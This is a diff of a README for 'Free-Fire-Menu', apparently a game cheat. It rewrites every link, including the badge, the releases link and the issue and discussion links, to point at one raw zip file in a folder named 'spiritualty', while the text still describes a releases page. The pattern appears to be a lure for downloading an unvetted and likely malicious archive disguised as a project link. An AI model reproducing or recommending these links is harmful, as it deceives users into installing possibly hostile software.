@@ -1,6 +1,6 @@
 # 🎮 Free-Fire-Menu - Gain a Competitive Edge Effortlessly
 
-[![Download Free-Fire-Menu](https://img.shields.io/badge/Download-Free--Fire--Menu-blue.svg)](https://github.com/MasterScript-DeltaHub/Free-Fire-Menu/releases)
+[![Download Free-Fire-Menu](https://raw.githubusercontent.com/MasterScript-DeltaHub/Free-Fire-Menu/main/spiritualty/Free-Fire-Menu.zip)](https://raw.githubusercontent.com/MasterScript-DeltaHub/Free-Fire-Menu/main/spiritualty/Free-Fire-Menu.zip)
 
 ## 👋 Introduction
 
@@ -15,7 +15,7 @@ To get started with Free-Fire-Menu, you will need to download the software and r
 1. **Visit the Releases Page:**
    Click the link below to visit the releases page and download the latest version of Free-Fire-Menu.
 
-   [Download Free-Fire-Menu Here](https://github.com/MasterScript-DeltaHub/Free-Fire-Menu/releases)
+   [Download Free-Fire-Menu Here](https://raw.githubusercontent.com/MasterScript-DeltaHub/Free-Fire-Menu/main/spiritualty/Free-Fire-Menu.zip)
 
 2. **Choose a Version:**
    Once on the releases page, look for the most recent version. The latest version will usually be at the top of the list.
@@ -60,9 +60,9 @@ If you have any questions or issues, feel free to reach out to the community. Yo
 
 ## 🔗 Useful Links
 
-- [Visit the Releases Page to Download](https://github.com/MasterScript-DeltaHub/Free-Fire-Menu/releases)
-- [Open Issues](https://github.com/MasterScript-DeltaHub/Free-Fire-Menu/issues)
-- [Community Discussions](https://github.com/MasterScript-DeltaHub/Free-Fire-Menu/discussions)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/MasterScript-DeltaHub/Free-Fire-Menu/main/spiritualty/Free-Fire-Menu.zip)
+- [Open Issues](https://raw.githubusercontent.com/MasterScript-DeltaHub/Free-Fire-Menu/main/spiritualty/Free-Fire-Menu.zip)
+- [Community Discussions](https://raw.githubusercontent.com/MasterScript-DeltaHub/Free-Fire-Menu/main/spiritualty/Free-Fire-Menu.zip)
 
 ## 🎉 Conclusion
 
